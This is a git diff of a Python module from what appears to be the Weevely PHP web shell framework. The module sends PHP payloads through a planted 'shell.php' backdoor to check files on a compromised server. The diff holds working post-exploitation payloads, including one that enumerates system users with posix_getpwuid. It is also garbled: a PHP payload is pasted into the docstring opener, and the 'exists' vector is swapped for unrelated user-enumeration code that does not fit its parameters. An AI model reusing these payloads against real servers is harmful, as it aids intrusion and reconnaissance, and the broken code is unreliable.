@@ -1,4 +1,4 @@
-'''
+"$f='%s'; (file_exists($f) || is_readable($f) || is_writable($f) || is_file($f) || is_dir($f)) && print(1);"'''
 Created on 20/set/2011
 
 @author: norby
@@ -6,6 +6,8 @@ Created on 20/set/2011
 
 
 from core.module import Module, ModuleException
+from core.vector import VectorList, Vector as V
+from core.parameters import ParametersList, Parameter as P
 
 classname = 'Check'
     
@@ -15,17 +17,33 @@ class Check(Module):
     '''
     
     
-    vectors = { 'shell.php' : { 
-                           "exists"             : "$f='%s'; (file_exists($f) || is_readable($f) || is_writable($f) || is_file($f) || is_dir($f)) && print(1);",
-                           "dir"            : "is_dir('%s') && print(1);",
-                           "md5"            : "print(md5_file('%s'));",
-                           "r"            : "is_readable('%s') && print(1);",
-                           "w"            : "is_writable('%s') && print(1);",
-                           "x"            : "is_executable('%s') && print(1);",
-                           "file"            : "is_file('%s') && print(1);"
-                            }
-           }
+    vectors = VectorList([
+    V('shell.php', 'exists', "for($n=0; $n<2000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).\'\n\';  }"),
+       V('shell.php', "dir" , "is_dir('%s') && print(1);"),
+       V('shell.php', "md5" , "print(md5_file('%s'));"),
+       V('shell.php',  "r", "is_readable('%s') && print(1);"),
+       V('shell.php', "w", "is_writable('%s') && print(1);"),
+       V('shell.php',  "x", "is_executable('%s') && print(1);"),
+       V('shell.php', "file", "is_file('%s') && print(1);")
+    ])
     
+
+    params = ParametersList('Check remote files type, md5 and permission', vectors.get_names_list(),
+                    P(arg='rpath', help='Choose remote file path', required=True, pos=0),
+                    P(arg='mode', help='Choose mode', required=True, choices=vectors.get_names_list(), pos=1))
+    
+    
+#    vectors = { 'shell.php' : { 
+#                           "exists"             : "$f='%s'; (file_exists($f) || is_readable($f) || is_writable($f) || is_file($f) || is_dir($f)) && print(1);",
+#                           "dir"            : "is_dir('%s') && print(1);",
+#                           "md5"            : "print(md5_file('%s'));",
+#                           "r"            : "is_readable('%s') && print(1);",
+#                           "w"            : "is_writable('%s') && print(1);",
+#                           "x"            : "is_executable('%s') && print(1);",
+#                           "file"            : "is_file('%s') && print(1);"
+#                            }
+#           }
+#    
     def __init__(self, modhandler, url, password):
 
         
@@ -48,21 +66,38 @@ class Check(Module):
         return False
         
     
-    def run(self, remote_path, mode):
+
+    def run_module(self, remote_path, mode):
         
-        mode_found = False
-                
-        interpreter, vector = self._get_default_vector()
-        if interpreter and vector:
-            return self.__execute_payload(interpreter, vector, remote_path, mode)
+        
+        # Skip default vector load, here vector=mode
+        
+        vector  = self.vectors.get_vector_by_name(mode)
+    
+        response = self.__execute_payload(vector, [remote_path, mode])
+        if response != None:
+            self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
+            return response
+    
+
+    def __execute_payload(self, vector, parameters):
+        
+        payload = self.__prepare_payload(vector, parameters)
+    
+        try:    
+            response = self.modhandler.load(vector.interpreter).run_module(payload)
+        except ModuleException:
+            response = None
         else:
-            for i in self.vectors:
-                if mode in self.vectors[i]:
-                    mode_found = True
-                    response = self.__execute_payload(i, mode, remote_path, mode)
-                    return response
-                    
-        if not mode_found:
-            raise ModuleException(self.name,  "Error, use exists|file|dir|md5|r|w|x as option.")
-            
+            return response
+
+        raise ModuleException(self.name,  "File check failed")
                 
+        
+    def __prepare_payload( self, vector, parameters ):
+
+        if vector.payloads[0].count( '%s' ) == len(parameters):
+            return vector.payloads[0] % tuple(parameters)
+        else:
+            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
+        
